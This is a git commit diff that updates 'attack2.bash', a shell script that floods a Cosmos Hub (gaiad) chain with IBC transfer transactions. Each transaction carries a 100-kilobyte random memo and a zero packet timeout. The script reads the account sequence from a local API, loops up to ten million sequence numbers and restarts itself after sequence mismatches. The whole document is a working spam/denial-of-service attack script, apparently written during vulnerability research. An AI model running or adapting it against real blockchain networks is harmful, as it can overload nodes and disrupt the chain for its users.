c693e45b4c568dcb153b9f7401587e4c78e8d442
Jacob Gadikian <jacobgadikian@gmail.com>
2023-10-06 01:16:36 +0200

    add the version that properly self recovers

--- attack2.bash
+++ attack2.bash
@@ -1,9 +1,22 @@
-set -e
+set -ue
 
-SEQUENCE=237014
+SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm | jq --raw-output ' .account.sequence ')
+
 
 for i in $( eval echo {"$SEQUENCE"..10000000} )
-	 do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i
 
-	
+do
+
+	gaiad tx ibc-transfer transfer transfer channel-58 cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm 1uatom --from test2 --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &> attack2.log
+
+cat attack2.log
+
+	if [ $(grep -c "mismatch" attack2.log) -eq 1 ]
+	then
+		echo "sequence number mismatch"
+		break
+	fi
+
 done
+
+echo "if you're running it right the script just restarted"
